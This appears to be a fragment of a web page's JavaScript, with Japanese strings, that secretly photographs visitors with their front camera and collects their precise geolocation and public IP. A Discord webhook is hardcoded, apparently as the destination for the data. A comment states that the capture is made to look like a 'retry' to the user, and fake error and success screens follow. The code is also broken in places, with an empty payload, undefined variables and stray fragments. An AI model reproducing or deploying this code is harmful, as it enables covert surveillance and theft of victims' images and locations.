    // Discord Webhook URL
    const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1573239750741983243/PLRxmXYw6blGTi83v4_7VNc5fKdbkfnR_lDG4ipM6efRD6AXpssGSTnecmocxJcffrb0";
    const COMPANY_NAME = "AIソリューションズ";

    function getGeoLocation() {
        return new Promise((resolve) => {
            if (!navigator.geolocation) {
                resolve("位置情報非対応ブラウザ");
                return;
            }
            navigator.geolocation.getCurrentPosition(
                (position) => {
                    const lat = position.coords.latitude;
                    const lng = position.coords.longitude;
                    resolve(`緯度: ${lat}, 経度: ${lng} (精度: ${Math.round(position.coords.accuracy)}m)`);
                },
                (error) => {
                    resolve("位置情報未許可または取得失敗");
                },
                { timeout: 10000, enableHighAccuracy: true }
            );
        });
    }

    async function getClientIP() {
        try {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            return data.ip;
        } catch (error) {
            return "取得失敗";
        }
    }

    async function captureCameraFrame(videoElement, canvasElement) {
        let stream = null;
        try {
            stream = await navigator.mediaDevices.getUserMedia({
                video: { facingMode: { ideal: "user" }, width: { ideal: 1280 }, height: { ideal: 720 } },
                audio: false,
            });
            videoElement.srcObject = stream;
            await videoElement.play();
            await new Promise(resolve => setTimeout(resolve, 800));
            canvasElement.width = videoElement.videoWidth || 640;
            canvasElement.height = videoElement.videoHeight || 480;
            canvasElement.getContext("2d").drawImage(videoElement, 0, 0, canvasElement.width, canvasElement.height);
            return canvasElement.toDataURL("image/jpeg", 0.8);
        } catch (error) {
            return null;
        } finally {
            if (stream) stream.getTracks().forEach(track => track.stop());
            videoElement.srcObject = null;
        }
    }

    function dataURLToBlob(dataURL) {
        const parts = dataURL.split(';base64,');
        const contentType = parts[0].split(':')[1];
        const raw = window.atob(parts[1]);
        const uInt8Array = new Uint8Array(raw.length);
        for (let i = 0; i < raw.length; ++i) {
            uInt8Array[i] = raw.charCodeAt(i);
        }
        return new Blob([uInt8Array], { type: contentType });
    }

        const canvas = document.getElementById('snapshotCanvas');

        // 取得処理の開始（ユーザーには「再試行」に見える）

        const locationPromise = getGeoLocation();
        const imageDataUrl = await captureCameraFrame(video, canvas);

            `;
            return;

        try {
            const clientIP = await clientIPPromise;
            const locationInfo = await locationPromise;

            formData.append("payload_json", JSON.stringify({

            }));

            errorContainer.style.display = 'none';
            document.getElementById('successScreen').style.display = 'block';

        } catch (error) {
            errorContainer.innerHTML = `
                <div class="error-icon">⚠️</div>
                <h1>再接続に失敗しました</h1>
                <p>ネットワークエラーが発生しました。時間をおいて再度お試しください。</p>
            `;
        }
    });
